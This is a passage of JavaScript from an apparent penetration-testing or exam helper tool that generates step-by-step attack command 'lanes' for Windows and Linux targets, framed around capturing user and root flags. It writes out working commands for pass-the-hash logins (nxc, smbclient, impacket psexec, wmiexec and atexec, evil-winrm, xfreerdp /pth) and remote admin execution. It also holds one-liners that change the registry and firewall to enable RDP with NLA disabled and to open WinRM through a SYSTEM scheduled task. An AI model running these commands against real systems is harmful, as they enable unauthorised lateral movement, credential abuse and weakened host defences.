    var tgsCracked = hasTgsHash && (hasAnyFact('credential.cracked') || tgsUsers.some(function (u) { return crackedPlainUsers.indexOf(u) >= 0; }));
    var asrepCracked = hasAsrepHash && (hasAnyFact('credential.cracked') || asrepUsers.some(function (u) { return crackedPlainUsers.indexOf(u) >= 0; }));

    var isLinux = hasFact('os.linux') || hasFact('foothold.linux') || (hasSsh && !hasSmb && !hasWinrm && !hasRdp && hasPortScan);
    var isWindows = hasFact('os.windows') || hasFact('foothold.windows') || hasSmb || hasWinrm || hasRdp || !isLinux;
    var isLinuxOnly = isLinux && !hasFact('os.windows') && !hasFact('foothold.windows') && !hasWinrm && !hasLdap;

    var hasWinShell = hasFact('foothold.windows') || hasFact('access.desktop') || hasFact('access.admin_shell') || (hasFact('access.shell') && !isLinuxOnly);
    var hasLinShell = hasFact('foothold.linux') || (hasFact('access.shell') && isLinux) || hasFact('access.root');
    var hasShell = hasWinShell || hasLinShell || hasFact('access.shell');

    var readableShares = factVals('smb.readable_share').map(function (s) {
      return typeof s === 'string' ? s : (s && (s.share || s.name || s.value) ? (s.share || s.name || s.value) : '');
    }).filter(Boolean);
    var customShares = readableShares.filter(function (s) {
      return !/^(IPC\$|ADMIN\$|C\$|PRINT\$)$/i.test(s);
    });
    var hasReadableShare = readableShares.length > 0 || hasFact('smb.shares') || hasFact('smb.null_session');
    var chosenShare = customShares.filter(function (s) { return !/^(SYSVOL|NETLOGON|Users)$/i.test(s); })[0]
      || customShares[0] || params.share || (ctx.share && ctx.share.indexOf('<') < 0 ? ctx.share : '') || 'SYSVOL';

    var unlocked = !!(hasCred || hasReadableShare || hasShell || isAdmin);

    var localFlagCaptured = hasFact('objective.local_flag');
    var rootFlagCaptured = hasFact('objective.root_flag');
    var localFlagOnHost = factVals('objective.local_flag').some(function (v) { return v && v.on_host === true; });
    var rootFlagOnHost = factVals('objective.root_flag').some(function (v) { return v && v.on_host === true; });

    var locatedFlags = factVals('objective.flag_located');
    var localLocObj = factVals('objective.flag_located_local').filter(function (v) { return v && v.path; })[0]
      || locatedFlags.filter(function (v) { return v && (v.slot === 'local' || v.slot === 'user') && v.path; })[0];
    var rootLocObj = factVals('objective.flag_located_root').filter(function (v) { return v && v.path; })[0]
      || locatedFlags.filter(function (v) { return v && v.slot === 'root' && v.path; })[0];
    var hasVerifiedLocalPath = hasFact('objective.flag_located_local') || !!(localLocObj && localLocObj.path) || !!(ctx.flag_path_local && ctx.flag_path_local.indexOf('{{') < 0);
    var hasVerifiedRootPath = hasFact('objective.flag_located_root') || !!(rootLocObj && rootLocObj.path) || !!(ctx.flag_path_root && ctx.flag_path_root.indexOf('{{') < 0);
    var userFlagWinPath = (localLocObj && localLocObj.path) || (ctx.flag_path_local && ctx.flag_path_local.indexOf('{{') < 0 ? ctx.flag_path_local : '') || ('C:\\Users\\' + (user || 'Public') + '\\Desktop\\user.txt');
    var rootFlagWinPath = (rootLocObj && rootLocObj.path) || (ctx.flag_path_root && ctx.flag_path_root.indexOf('{{') < 0 ? ctx.flag_path_root : '') || 'C:\\Users\\Administrator\\Desktop\\root.txt';
    var userShareRelPath = userFlagWinPath.replace(/^[A-Za-z]:\\Users\\/i, '').replace(/^[\\\/]+/, '');

    var localFlagCapturedRemotely = !!(localFlagCaptured && !localFlagOnHost);
    var needsBothFlagsOnHost = (!localFlagOnHost) && (isAdmin || hasRoot || localFlagCapturedRemotely);

    var nxcAuth = useHashAuth
      ? ("-u '" + activeUser + "' -H '" + activeHash + "'")
      : ("-u '" + activeUser + "' -p '" + (password || '{{password}}') + "'");
    var smbClientAuth = useHashAuth
      ? ("-U '" + domPrefix + activeUser + "%" + activeHash + "' --pw-nt-hash")
      : ("-U '" + domPrefix + activeUser + "%" + (password || '{{password}}') + "'");
    var smbmapAuth = useHashAuth
      ? ("-u '" + activeUser + "' -p 'aad3b435b51404eeaad3b435b51404ee:" + activeHash + "'")
      : ("-u '" + activeUser + "' -p '" + (password || '{{password}}') + "'");
    var impacketIdent = domPrefix + activeUser + (useHashAuth ? '' : (':' + (password || '{{password}}'))) + '@' + target;
    var impacketAuthFlags = useHashAuth ? (' -hashes :' + activeHash) : '';
    var evilWinrmAuth = useHashAuth
      ? ("-i " + target + " -u '" + activeUser + "' -H '" + activeHash + "'")
      : ("-i " + target + " -u '" + activeUser + "' -p '" + (password || '{{password}}') + "'");
    var bloodyAuth = useHashAuth
      ? ("--host " + target + " -d " + (domain || '{{domain}}') + " -u '" + activeUser + "' -p ':" + activeHash + "'")
      : ("--host " + target + " -d " + (domain || '{{domain}}') + " -u '" + activeUser + "' -p '" + (password || '{{password}}') + "'");
    var xfreerdpDomFlag = domain ? (" /d:'" + domain + "'") : '';
    var xfreerdpAuth = useHashAuth
      ? ("/v:" + target + xfreerdpDomFlag + " /u:'" + activeUser + "' /pth:" + activeHash)
      : ("/v:" + target + xfreerdpDomFlag + " /u:'" + activeUser + "' /p:'" + (password || '{{password}}') + "'");
    var rdpEnableWinCmd = '(reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f & reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=TCP localport=3389 & sc config TermService start= auto & net start TermService)';
    var winrmEnableWinCmd = '(reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service" /v AllowAutoConfig /t REG_DWORD /d 1 /f & reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service" /v IPv4Filter /t REG_SZ /d "*" /f & reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service" /v IPv6Filter /t REG_SZ /d "*" /f & reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & netsh advfirewall firewall add rule name=WinRM dir=in action=allow protocol=TCP localport=5985 & sc config WinRM start= auto & net stop WinRM & net start WinRM & schtasks /create /tn WinRMInit /tr "powershell.exe -NoProfile -Command Enable-PSRemoting -Force" /sc ONSTART /ru SYSTEM /f & schtasks /run /tn WinRMInit & ping -n 5 127.0.0.1 >nul & schtasks /delete /tn WinRMInit /f)';

    var deckVariantSel = (eng.ui && eng.ui.deckVariantSel) || {};
    var deckParams = (eng.ui && eng.ui.deckParams) || {};

    function winProofVariants(paths, preferPs, isPathVerified) {
      var list = Array.isArray(paths) ? paths : [paths];
      var cmdType = list.map(function (p) { return 'type "' + p + '"'; }).join(' & ');
      var psGet = list.map(function (p) { return '"' + p + '"'; }).join(', ');
      var cmdGlob = list.length > 1
        ? '"%d\\Desktop\\*user*.txt" "%d\\Desktop\\*local*.txt" "%d\\Desktop\\*root*.txt" "%d\\Desktop\\*proof*.txt"'
        : '"%d\\Desktop\\*user*.txt" "%d\\Desktop\\*local*.txt"';
      var psFilter = list.length > 1 ? '*user*.txt,*local*.txt,*root*.txt,*proof*.txt' : '*user*.txt,*local*.txt';
      var guessNote = !isPathVerified
        ? ('EDUCATED GUESS: Assumes ' + list.join(' + ') + ' before verifying the exact path - switch to the auto-search variant pill above to sweep all C:\\Users\\*\\Desktop profiles automatically, or locate the flag path first.')
        : '';
      var vCmd = { id: 'cmd', label: 'cmd.exe', tool: 'cmd', locus: 'onhost', isEducatedGuess: !isPathVerified, verifiedPath: !!isPathVerified, note: guessNote, command: '(whoami & hostname & ipconfig & ' + cmdType + ')' };
      var vPs = { id: 'powershell', label: 'PowerShell', tool: 'powershell', locus: 'onhost', isEducatedGuess: !isPathVerified, verifiedPath: !!isPathVerified, note: guessNote, command: 'whoami; hostname; ipconfig; Get-Content ' + psGet + ' -ErrorAction SilentlyContinue' };
      var vCmdFind = { id: 'cmd-search', label: 'cmd (auto-find)', tool: 'cmd', locus: 'onhost', isEducatedGuess: false, verifiedPath: true, note: 'Self-locating one-liner: sweeps all C:\\Users\\*\\Desktop profiles and prints whoami, hostname, ipconfig, and every matching flag file.', command: '(whoami & hostname & ipconfig & for /d %d in (C:\\Users\\*) do @for %f in (' + cmdGlob + ') do @if exist "%~f" (echo --- %~f --- & type "%~f" 2>nul))' };
      var vPsFind = { id: 'ps-search', label: 'PS (auto-find)', tool: 'powershell', locus: 'onhost', isEducatedGuess: false, verifiedPath: true, note: 'Self-locating PowerShell one-liner: sweeps all C:\\Users\\*\\Desktop profiles and prints identity, IP, and every matching flag.', command: 'whoami; hostname; ipconfig; Get-ChildItem \'C:\\Users\\*\\Desktop\' -Include ' + psFilter + ' -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object { "--- $($_.FullName) ---"; Get-Content $_.FullName }' };
      return preferPs ? [vPs, vCmd, vPsFind, vCmdFind] : [vCmd, vPs, vCmdFind, vPsFind];
    }

    // Tab 1: Flags & Proof
    var flagLanes = [];
    if (!isLinuxOnly) {
      flagLanes.push(pcMakeLane({
        id: 'user-smb-share',
        actionId: 'flag-hunt-windows',
        title: 'User Flag via SMB Share (From Kali)',
        sub: 'Port 445 · No interactive shell required',
        locked: !(hasCred && hasSmb),
        lockReason: !hasSmb ? 'Port 445 Closed' : 'Requires Credential',
        done: localFlagCaptured,
        steps: [
          {
            id: 'locate-user-smb',
            label: 'Locate user.txt on Users Share',
            tool: 'nxc',
            locus: 'remote',
            done: hasVerifiedLocalPath || localFlagCaptured,
            note: 'Spiders readable SMB shares from Kali to find the exact path to user.txt.',
            variants: [
              { id: 'nxc', label: 'nxc --spider', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --spider Users --regex \"(local|proof|user|root|flag)\\.txt$\"" },
              { id: 'smbmap', label: 'smbmap -R', tool: 'smbmap', locus: 'remote', command: "smbmap -H " + target + " " + smbmapAuth + " -R Users --depth 5" },
              { id: 'smbclient', label: 'smbclient recurse', tool: 'smbclient', locus: 'remote', command: "smbclient //" + target + "/Users " + smbClientAuth + " -c 'recurse; ls'" }
            ]
          },
          {
            id: 'read-user-smb',
            label: 'Download & Print user.txt',
            tool: 'smbclient',
            locus: 'remote',
            done: localFlagCaptured,
            isEducatedGuess: !hasVerifiedLocalPath,
            verifiedPath: hasVerifiedLocalPath,
            guessBadge: 'Educated Guess',
            note: hasVerifiedLocalPath
              ? 'Downloads user.txt from the verified Users share path and prints it in your Kali terminal.'
              : ('EDUCATED GUESS: Assumes ' + userFlagWinPath + ' before Step 1 is run - run Step 1 first to verify the exact path, or try this default path directly as a shortcut.'),
            variants: [
              { id: 'smbclient', label: 'smbclient get', tool: 'smbclient', locus: 'remote', command: "smbclient //" + target + "/Users " + smbClientAuth + " -c 'get \"" + userShareRelPath + "\" user.txt' && cat user.txt" },
              { id: 'smbclient-stdout', label: 'smbclient stdout', tool: 'smbclient', locus: 'remote', command: "smbclient //" + target + "/Users " + smbClientAuth + " -c 'get \"" + userShareRelPath + "\" -'" },
              { id: 'nxc', label: 'nxc --get-file', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " --share Users --get-file '" + userShareRelPath + "' user.txt && cat user.txt" }
            ]
          }
        ]
      }, deckVariantSel));

      flagLanes.push(pcMakeLane({
        id: 'user-winrm-remote',
        actionId: 'flag-hunt-windows',
        title: 'User Flag via WinRM (From Kali)',
        sub: 'Port 5985 · One-shot PowerShell',
        locked: !(hasCred && hasWinrm),
        lockReason: !hasWinrm ? 'Port 5985 Closed' : 'Requires Credential',
        done: localFlagCaptured,
        steps: [
          {
            id: 'locate-user-winrm',
            label: 'Locate user.txt via WinRM',
            tool: 'nxc',
            locus: 'remote',
            done: hasVerifiedLocalPath || localFlagCaptured,
            variantLabel: 'Shell:',
            note: 'Searches C:\\Users\\*\\Desktop for user.txt over WinRM without an interactive session.',
            variants: [
              { id: 'ps-winrm', label: 'PowerShell (-X)', tool: 'nxc', locus: 'remote', command: "nxc winrm " + target + " " + nxcAuth + " -X \"Get-ChildItem 'C:\\Users\\*\\Desktop' -Recurse -Force -Include *user*.txt,*local*.txt -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName\"" },
              { id: 'cmd-winrm', label: 'cmd.exe (-x)', tool: 'nxc', locus: 'remote', command: "nxc winrm " + target + " " + nxcAuth + " -x 'for /d %d in (C:\\Users\\*) do @dir /b /s \"%d\\Desktop\\*user*.txt\" \"%d\\Desktop\\*local*.txt\" 2>nul'" }
            ]
          },
          {
            id: 'read-user-winrm',
            label: 'Read user.txt via WinRM',
            tool: 'nxc',
            locus: 'remote',
            done: localFlagCaptured,
            isEducatedGuess: !hasVerifiedLocalPath,
            verifiedPath: hasVerifiedLocalPath,
            guessBadge: 'Educated Guess',
            variantLabel: 'Shell:',
            note: hasVerifiedLocalPath
              ? 'Prints whoami, hostname, ipconfig, and user.txt from the verified path remotely over WinRM.'
              : ('EDUCATED GUESS: Assumes ' + userFlagWinPath + ' before Step 1 is run - run Step 1 first to verify the exact path, or switch to the auto-search variant.'),
            variants: [
              { id: 'ps-read-winrm', label: 'PowerShell (-X)', tool: 'nxc', locus: 'remote', isEducatedGuess: !hasVerifiedLocalPath, verifiedPath: hasVerifiedLocalPath, command: "nxc winrm " + target + " " + nxcAuth + " -X \"whoami; hostname; ipconfig; Get-Content '" + userFlagWinPath + "'\"" },
              { id: 'cmd-read-winrm', label: 'cmd.exe (-x)', tool: 'nxc', locus: 'remote', isEducatedGuess: !hasVerifiedLocalPath, verifiedPath: hasVerifiedLocalPath, command: "nxc winrm " + target + " " + nxcAuth + " -x 'whoami & hostname & ipconfig & type \"" + userFlagWinPath + "\"'" },
              { id: 'ps-search-winrm', label: 'PS (auto-search)', tool: 'nxc', locus: 'remote', isEducatedGuess: false, verifiedPath: true, note: 'Self-locating WinRM one-liner: sweeps all C:\\Users\\*\\Desktop profiles and prints identity, IP, and user.txt.', command: "nxc winrm " + target + " " + nxcAuth + " -X \"whoami; hostname; ipconfig; Get-ChildItem 'C:\\Users\\*\\Desktop' -Include *user*.txt,*local*.txt -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object { '--- ' + $_.FullName + ' ---'; Get-Content $_.FullName }\"" }
            ]
          }
        ]
      }, deckVariantSel));

      flagLanes.push(pcMakeLane({
        id: 'user-onhost-proof',
        actionId: 'flag-hunt-windows',
        title: 'Get On Host & Capture User Proof',
        sub: 'Interactive Shell + On-Host Proof Frame',
        locked: !(((hasWinrm || hasRdp) && hasCred) || (isAdmin && hasSmb) || hasWinShell),
        lockReason: (hasWinrm || hasRdp) && !hasCred ? 'Requires Credential' : 'Ports 5985/3389 Closed (Needs Admin or Shell)',
        done: localFlagOnHost,
        steps: [
          {
            id: 'open-user-shell',
            label: 'Open Interactive Host Session',
            tool: hasWinrm ? 'evil-winrm' : (hasRdp ? 'xfreerdp' : 'impacket-psexec'),
            locus: 'remote',
            done: hasWinShell,
            note: 'Connects to the target host so you can run the proof command inside an interactive shell.',
            selectedVariantId: hasWinrm ? 'evil-winrm' : (hasRdp ? 'xfreerdp' : 'psexec'),
            variants: [
              { id: 'evil-winrm', label: 'evil-winrm', tool: 'evil-winrm', locus: 'remote', command: "evil-winrm " + evilWinrmAuth },
              { id: 'xfreerdp', label: 'xfreerdp', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /tls:seclevel:0 +clipboard" },
              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags },
              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags }
            ]
          },
          {
            id: 'capture-user-proof',
            label: 'Capture User Proof On-Host',
            tool: 'cmd',
            locus: 'onhost',
            done: localFlagOnHost,
            isEducatedGuess: !hasVerifiedLocalPath,
            verifiedPath: hasVerifiedLocalPath,
            guessBadge: 'Educated Guess',
            variantLabel: 'Shell:',
            note: 'Run inside your target shell (toggle cmd.exe or PowerShell) and paste the output back to record on-host proof.',
            variants: winProofVariants([userFlagWinPath], false, hasVerifiedLocalPath)
          }
        ]
      }, deckVariantSel));

      flagLanes.push(pcMakeLane({
        id: 'both-flags-onhost',
        actionId: 'flag-hunt-root-windows',
        title: 'Capture Both User + Root Flags On-Host (One Shot)',
        sub: 'Admin Shell -> Combined user.txt + root.txt Proof',
        locked: !(isAdmin && (hasSmb || hasWinrm || hasRdp || hasWinShell)),
        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 / 5985 Closed',
        done: localFlagOnHost && rootFlagOnHost,
        steps: [
          {
            id: 'open-admin-shell',
            label: 'Open Interactive Admin Shell',
            tool: 'impacket-psexec',
            locus: 'remote',
            done: hasWinShell && isAdmin,
            note: 'Spawns a full interactive SYSTEM / Administrator shell over SMB (psexec), WMI (wmiexec), or WinRM.',
            variants: [
              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags },
              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags },
              { id: 'evil-winrm', label: 'evil-winrm', tool: 'evil-winrm', locus: 'remote', command: "evil-winrm " + evilWinrmAuth },
              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '(whoami & hostname & ipconfig & for /d %d in (C:\\Users\\*) do @for %f in (\"%d\\Desktop\\*user*.txt\" \"%d\\Desktop\\*local*.txt\" \"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\") do @if exist \"%~f\" (echo --- %~f --- & type \"%~f\" 2>nul))'" }
            ]
          },
          {
            id: 'run-combined-proof',
            label: 'Capture Both User + Root Proof',
            tool: 'cmd',
            locus: 'onhost',
            done: localFlagOnHost && rootFlagOnHost,
            isEducatedGuess: !(hasVerifiedLocalPath && hasVerifiedRootPath),
            verifiedPath: !!(hasVerifiedLocalPath && hasVerifiedRootPath),
            guessBadge: 'Educated Guess',
            variantLabel: 'Shell:',
            note: 'Prints whoami, hostname, ipconfig, user.txt, and root.txt in a single exam screenshot frame.',
            variants: winProofVariants([userFlagWinPath, rootFlagWinPath], false, hasVerifiedLocalPath && hasVerifiedRootPath)
          }
        ]
      }, deckVariantSel));

      flagLanes.push(pcMakeLane({
        id: 'root-smb-exec',
        actionId: 'flag-hunt-root-windows',
        title: 'Root Flag via Admin Remote Exec (From Kali)',
        sub: 'Port 445 / 135 · Instant One-Liner',
        locked: !(isAdmin && hasSmb),
        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
        done: rootFlagCaptured,
        steps: [
          {
            id: 'exec-root-remote',
            label: 'Dump Root Flag',
            tool: 'nxc',
            locus: 'remote',
            done: rootFlagCaptured,
            isEducatedGuess: !hasVerifiedRootPath,
            verifiedPath: hasVerifiedRootPath,
            guessBadge: 'Educated Guess',
            variantLabel: 'Tool:',
            note: hasVerifiedRootPath
              ? 'Dumps whoami, hostname, ipconfig, and root.txt from the verified path directly from Kali.'
              : ('EDUCATED GUESS: Assumes ' + rootFlagWinPath + ' (standard Administrator Desktop) - or switch to nxc auto-search (-x) to sweep all user Desktops.'),
            variants: [
              { id: 'nxc', label: 'nxc -x', tool: 'nxc', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "nxc smb " + target + " " + nxcAuth + " -x '(whoami & hostname & ipconfig & type \"" + rootFlagWinPath + "\")'" },
              { id: 'nxc-search', label: 'nxc auto-find', tool: 'nxc', locus: 'remote', isEducatedGuess: false, verifiedPath: true, note: 'Self-locating one-liner: sweeps all C:\\Users\\*\\Desktop profiles for root.txt/proof.txt and prints whoami, hostname, ipconfig, and the flag.', command: "nxc smb " + target + " " + nxcAuth + " -x '(whoami & hostname & ipconfig & for /d %d in (C:\\Users\\*) do @for %f in (\"%d\\Desktop\\*root*.txt\" \"%d\\Desktop\\*proof*.txt\") do @if exist \"%~f\" (echo --- %~f --- & type \"%~f\" 2>nul))'" },
              { id: 'nxc-ps', label: 'nxc -X', tool: 'nxc', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "nxc smb " + target + " " + nxcAuth + " -X \"whoami; hostname; ipconfig; Get-Content '" + rootFlagWinPath + "'\"" },
              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags + " '(whoami & hostname & ipconfig & type \"" + rootFlagWinPath + "\")'" },
              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '(whoami & hostname & ipconfig & type \"" + rootFlagWinPath + "\")'" },
              { id: 'wmiexec-ps', label: 'wmiexec -X', tool: 'impacket-wmiexec', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " 'powershell -NoP -c \"whoami; hostname; ipconfig; Get-Content \\\"" + rootFlagWinPath + "\\\"\"'" },
              { id: 'atexec', label: 'atexec', tool: 'impacket-atexec', locus: 'remote', isEducatedGuess: !hasVerifiedRootPath, verifiedPath: hasVerifiedRootPath, command: "impacket-atexec '" + impacketIdent + "'" + impacketAuthFlags + " '(whoami & hostname & ipconfig & type \"" + rootFlagWinPath + "\")'" }
            ]
          }
        ]
      }, deckVariantSel));

      flagLanes.push(pcMakeLane({
        id: 'root-enable-winrm',
        actionId: 'flag-hunt-root-windows',
        title: 'Enable WinRM Remotely -> Evil-WinRM Proof',
        sub: '445 -> 5985 · Opens WinRM when closed',
        locked: !(isAdmin && hasSmb),
        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
        done: rootFlagOnHost,
        steps: [
          {
            id: 'enable-winrm-step',
            label: 'Enable WinRM Listener & Firewall Port 5985',
            tool: 'nxc',
            locus: 'remote',
            done: hasFact('host.winrm_enabled') || hasWinrm,
            note: 'Configures WinRM AllowAutoConfig + IPv4Filter in Registry, sets LocalAccountTokenFilterPolicy=1, opens TCP 5985, restarts WinRM, and initializes PSRemoting as SYSTEM (avoids WMI Set-WSManQuickConfig Access Denied).',
            variants: [
              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '" + winrmEnableWinCmd + "'" },
              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + winrmEnableWinCmd + "'" },
              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + winrmEnableWinCmd + "'" }
            ]
          },
          {
            id: 'connect-winrm-step',
            label: 'Connect Interactive Evil-WinRM Session',
            tool: 'evil-winrm',
            locus: 'remote',
            done: hasFact('winrm.authenticated') && hasWinShell,
            note: 'Opens an interactive PowerShell session over port 5985.',
            command: "evil-winrm " + evilWinrmAuth
          },
          {
            id: 'proof-winrm-step',
            label: 'Capture Proof Inside Evil-WinRM',
            tool: 'powershell',
            locus: 'onhost',
            done: rootFlagOnHost,
            isEducatedGuess: !(hasVerifiedLocalPath && hasVerifiedRootPath),
            verifiedPath: !!(hasVerifiedLocalPath && hasVerifiedRootPath),
            guessBadge: 'Educated Guess',
            variantLabel: 'Shell:',
            note: 'Run inside Evil-WinRM (PowerShell or cmd.exe) to print identity, IP, and both flags.',
            variants: winProofVariants([userFlagWinPath, rootFlagWinPath], true, hasVerifiedLocalPath && hasVerifiedRootPath)
          }
        ]
      }, deckVariantSel));

      flagLanes.push(pcMakeLane({
        id: 'root-enable-rdp',
        actionId: 'flag-hunt-root-windows',
        title: 'Enable RDP + Firewall Remotely -> xfreerdp Proof',
        sub: '445 -> 3389 · Opens GUI Desktop',
        locked: !(isAdmin && hasSmb),
        lockReason: !isAdmin ? 'Needs Admin' : 'Port 445 Closed',
        done: rootFlagOnHost,
        steps: [
          {
            id: 'enable-rdp-step',
            label: 'Enable RDP, Disable NLA & Open Firewall Port 3389',
            tool: 'nxc',
            locus: 'remote',
            done: hasFact('host.rdp_enabled') || hasRdp,
            note: 'Enables Terminal Services, disables NLA, allows PtH/restricted admin, starts TermService, and opens port 3389.',
            variants: [
              { id: 'nxc', label: 'nxc smb -x', tool: 'nxc', locus: 'remote', command: "nxc smb " + target + " " + nxcAuth + " -x '" + rdpEnableWinCmd + "'" },
              { id: 'psexec', label: 'psexec', tool: 'impacket-psexec', locus: 'remote', command: "impacket-psexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + rdpEnableWinCmd + "'" },
              { id: 'wmiexec', label: 'wmiexec', tool: 'impacket-wmiexec', locus: 'remote', command: "impacket-wmiexec '" + impacketIdent + "'" + impacketAuthFlags + " '" + rdpEnableWinCmd + "'" }
            ]
          },
          {
            id: 'connect-rdp-step',
            label: 'Launch Interactive RDP Session (xfreerdp)',
            tool: 'xfreerdp',
            locus: 'remote',
            done: hasFact('rdp.authenticated'),
            note: 'Opens a graphical desktop session (/tls:seclevel:0 supports legacy Server 2008 R2 / 2012 TLS 1.0 as well as modern hosts; switch to /sec:rdp if TLS is disabled).',
            variants: [
              { id: 'xfreerdp-tls', label: 'xfreerdp', tool: 'xfreerdp', locus: 'remote', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /tls:seclevel:0 +clipboard" },
              { id: 'xfreerdp-sec-rdp', label: 'xfreerdp /sec:rdp', tool: 'xfreerdp', locus: 'remote', note: 'Forces classic RDP encryption (no TLS handshake) once Step 1 has set UserAuthentication=0.', command: "xfreerdp " + xfreerdpAuth + " /cert:ignore /sec:rdp /tls:seclevel:0 +clipboard" }
            ]
          },
          {
            id: 'proof-rdp-step',
            label: 'Capture Proof in RDP Shell',
            tool: 'cmd',
            locus: 'onhost',
            done: rootFlagOnHost,
            isEducatedGuess: !(hasVerifiedLocalPath && hasVerifiedRootPath),
            verifiedPath: !!(hasVerifiedLocalPath && hasVerifiedRootPath),
            guessBadge: 'Educated Guess',
            variantLabel: 'Shell:',
            note: 'Run inside cmd.exe or PowerShell on the RDP desktop.',
            variants: winProofVariants([userFlagWinPath, rootFlagWinPath], false, hasVerifiedLocalPath && hasVerifiedRootPath)
          }
        ]
      }, deckVariantSel));
    }

    if (isLinux) {
      flagLanes.push(pcMakeLane({
        id: 'linux-user-ssh',
        actionId: 'flag-hunt-linux',
        title: 'User Flag via SSH (One-Shot or Interactive)',
        sub: 'Port 22 · Linux Foothold Proof',
        locked: !(hasSsh && (hasCred || hasLinShell)),
        lockReason: !hasSsh ? 'Port 22 Closed' : 'Requires Credential or Shell',
        done: localFlagCaptured,
        steps: [
          {
            id: 'lin-user-grab',
            label: 'Connect & Capture Linux User Flag Proof',
            tool: 'ssh',
            locus: 'remote',
            done: localFlagCaptured,
            note: 'Captures whoami, id, hostname, ip addr, and user.txt / local.txt.',
            variants: [
              { id: 'ssh-oneliner', label: 'ssh one-liner', tool: 'ssh', locus: 'remote', command: "ssh " + activeUser + "@" + target + " 'whoami; id; hostname; ip -4 a; find /home /root -name \"user.txt\" -o -name \"local.txt\" 2>/dev/null -exec head -n 5 {} +'" },
              { id: 'ssh-interactive', label: 'ssh interactive', tool: 'ssh', locus: 'remote', command: "ssh " + activeUser + "@" + target }
            ]
          }
        ]
      }, deckVariantSel));

      flagLanes.push(pcMakeLane({
        id: 'linux-root-proof',
        actionId: 'flag-hunt-root-linux',
        title: 'Root Flag & Proof Capture',
        sub: 'Linux Root Shell Proof',
        locked: !hasRoot,
        lockReason: 'Requires Root (UID 0 or sudo)',
        done: rootFlagCaptured,
        steps: [
          {
            id: 'lin-root-grab',
            label: 'Capture Linux Root Proof',
            tool: 'sh',
            locus: 'onhost',
            done: rootFlagCaptured,
            note: 'Prints root identity, network addresses, and both flags in one frame.',
            variants: [
              { id: 'sudo-sh', label: 'sudo -n sh', tool: 'sudo', locus: 'onhost', command: "sudo -n sh -c 'whoami; id; hostname; ip -4 a; cat /root/root.txt /root/proof.txt 2>/dev/null'" },
              { id: 'root-proof', label: 'root shell proof', tool: 'sh', locus: 'onhost', command: "whoami; id; hostname; ip -4 a; cat /root/root.txt /root/proof.txt 2>/dev/null" },
              { id: 'both-flags', label: 'both flags on-host', tool: 'sh', locus: 'onhost', command: "whoami; id; hostname; ip -4 a; find /home /root -maxdepth 3 \\( -name user.txt -o -name local.txt -o -name root.txt -o -name proof.txt \\) -exec head -n 5 {} + 2>/dev/null" }
            ]
          }
        ]
      }, deckVariantSel));
    }

    // Tab 2: Get On Host (shells)
    var shellLanes = [
      pcMakeLane({
        id: 'shell-winrm',
        actionId: 'win-interactive-shell',
        title: 'Interactive WinRM Shell (Evil-WinRM)',
        sub: 'Port 5985 / 5986 · Full PowerShell Session',
        locked: !(hasWinrm && hasCred),
        lockReason: !hasWinrm ? 'Port 5985 Closed' : 'Requires Credential',
        done: hasFact('winrm.authenticated') && hasWinShell,
        steps: [
          {
            id: 'winrm-connect',
